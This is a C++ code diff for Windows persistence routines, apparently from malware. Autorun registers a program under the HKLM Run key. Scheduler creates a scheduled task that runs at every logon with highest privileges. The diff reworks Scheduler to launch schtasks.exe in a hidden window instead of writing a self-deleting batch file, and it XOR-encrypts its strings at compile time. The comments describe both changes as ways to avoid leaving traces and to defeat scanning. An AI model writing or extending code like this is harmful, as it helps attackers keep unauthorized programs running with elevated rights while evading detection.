@@ -89,8 +89,8 @@ void Manager::ReadData(Settings* s) {
 
 void Manager::Autorun(const char* path, const char* name) {
 	HKEY reg_key = 0;
-	const char* address = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
-	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, address, 0, KEY_SET_VALUE, &reg_key) != ERROR_SUCCESS)
+	std::string address = S("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
+	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, address.c_str(), 0, KEY_SET_VALUE, &reg_key) != ERROR_SUCCESS)
 		return;
 	DWORD len = (DWORD)(strlen(path) + 1);
 	RegSetValueExA(reg_key, name, 0, REG_SZ, (const BYTE*)path, len);
@@ -98,18 +98,36 @@ void Manager::Autorun(const char* path, const char* name) {
 }
 
 void Manager::Scheduler(const char* path, const char* name) {
-	// /RL HIGHEST = run with highest available privileges (no UAC prompt at logon)
-	// /F = force-create even if task already exists
-	// /SC ONLOGON = run every time any user logs on
-	std::ofstream schd(BAT_SCHD);
-	schd << "@echo off\r\n";
-	schd << "SCHTASKS /CREATE /F /SC ONLOGON /RL HIGHEST /TN \""
-	     << name << "\" /TR \"" << path << "\"\r\n";
-	schd << "DEL \"%~f0\"\r\n";
-	schd.close();
+	// Run schtasks.exe directly via CreateProcess — no batch file written to disk.
+	// All flag strings are XOR-encrypted at compile time.
+	char sysdir[MAX_PATH] = {};
+	GetSystemDirectoryA(sysdir, sizeof(sysdir) - 1);
 
-	Sleep(200);
-	ShellExecuteA(0, "open", BAT_SCHD, 0, 0, SW_HIDE);
+	std::string exePath = std::string(sysdir) + "\\" + S("schtasks.exe");
+
+	std::string cmd = S("schtasks");
+	cmd += S(" /CREATE /F /SC ONLOGON /RL HIGHEST /TN \"");
+	cmd += name;
+	cmd += S("\" /TR \"");
+	cmd += path;
+	cmd += "\"";
+
+	std::vector<char> cmdBuf(cmd.begin(), cmd.end());
+	cmdBuf.push_back('\0');
+
+	STARTUPINFOA si = {};
+	si.cb       = sizeof(si);
+	si.dwFlags  = STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_HIDE;
+	PROCESS_INFORMATION pi = {};
+
+	if (CreateProcessA(exePath.c_str(), cmdBuf.data(),
+	                   NULL, NULL, FALSE, CREATE_NO_WINDOW,
+	                   NULL, NULL, &si, &pi)) {
+		WaitForSingleObject(pi.hProcess, 10000);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+	}
 }
 
 long Manager::GetFileSize(const char* filename) {
